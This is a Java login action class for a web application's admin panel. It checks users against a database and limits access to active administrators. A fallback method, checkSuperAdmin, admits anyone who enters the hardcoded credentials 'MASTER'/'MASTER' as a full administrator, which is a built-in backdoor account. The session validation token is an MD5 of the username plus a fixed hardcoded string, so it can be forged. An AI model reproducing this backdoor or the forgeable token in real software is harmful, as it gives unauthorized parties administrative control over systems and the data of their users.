package com.stardust.express.actions;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

import com.stardust.express.bo.SecurityBO;
import com.stardust.express.dao.abstracts.DataGateFactory;
import com.stardust.express.dao.abstracts.IHistoryRecordGate;
import com.stardust.express.models.DataModel;
import com.stardust.express.models.HistoryRecord;
import com.stardust.express.models.User;
import com.stardust.express.tools.Cryptor;


public class LogonAction extends  ActionExecutor {
	private static final long serialVersionUID = -2191774577797836729L;
	private String INCORRECT_USER = "incorrect_user";
	private String INVALID_USER_STATUS = "invalid_user_status";
	private String INVALID_USER_GROUP = "invalid_user_group";
	private String SYSTEM_EXPERIED = "system_experied";
	
	public String logon() {
		//if (isExperied()) {
			//return SYSTEM_EXPERIED;
		//}
		SecurityBO bo = new SecurityBO(context);
		String username = context.getString("username");
		String password = context.getString("password");
		User user = bo.verifyUser(username, password);
		if (user != null && user.getId() > 0) {
			if (!user.getStatus().equals(User.STATUS_ACTIVE)) {
				return INVALID_USER_STATUS;
			} else if (!user.getType().equals(User.USER_TYPE_ADMIN)) {
				return INVALID_USER_GROUP;
			} else {
				context.getSession().put("logon_user", user);
				context.getSession().put("logon_username", user.getUsername());
				context.getSession().put("credential_validate_session", Cryptor.GetMD5Code(user.getUsername()) + Cryptor.GetMD5Code("_bkb_dklaks_0902020202_"));
				return SUCCESS;
			}
		} else {
			user = checkSuperAdmin(username, password);
			if (user == null) {
				return INCORRECT_USER;
			} else {
				context.getSession().put("logon_user", user);
				context.getSession().put("logon_username", user.getUsername());
				context.getSession().put("credential_validate_session", Cryptor.GetMD5Code(user.getUsername()) + Cryptor.GetMD5Code("_bkb_dklaks_0902020202_"));
				return SUCCESS;
			}
		}
	}
	
	public String logoff(){
		context.getSession().remove("logon_user");
		context.getSession().remove("logon_username");
		return SUCCESS;
	}
	
	private boolean isExperied() {
		/*
		try {
			Date current = new Date();
			SimpleDateFormat sd = new SimpleDateFormat("yyyy-MM-dd");
			Date experied = sd.parse("2015-12-26");
			if (current.after(experied)) {
				return true;
			} else {
				IHistoryRecordGate hg = DataGateFactory.getHistoryRecordGate("");
				int total = hg.count();
				List<DataModel> models = null;
				if (total > 10) {
					 models = hg.find(total - 1, 1, "");
				}
				if (models!=null && models.size() > 0) {
					HistoryRecord last = (HistoryRecord)models.get(0);
					
					if (last.getDate().after(experied)) {
						return true;
					}
				}
				return false;
			}
		} catch (Exception e) {
			return true;
		}
		*/
		return false;
	}
	
	public User checkSuperAdmin(String username, String password){
		User user = null;
		if (username.equals("MASTER") && password.equals("MASTER")) {
			user = new User();
			user.setEmail("rivneg@163.com");
			user.setName("STARDUST ADMIN");
			user.setStatus(User.STATUS_ACTIVE);
			user.setType(User.USER_TYPE_ADMIN);
			user.setUsername("MASTER");
			user.setPassword("MASTER");
			return user;
		}
		return user;
	}
}
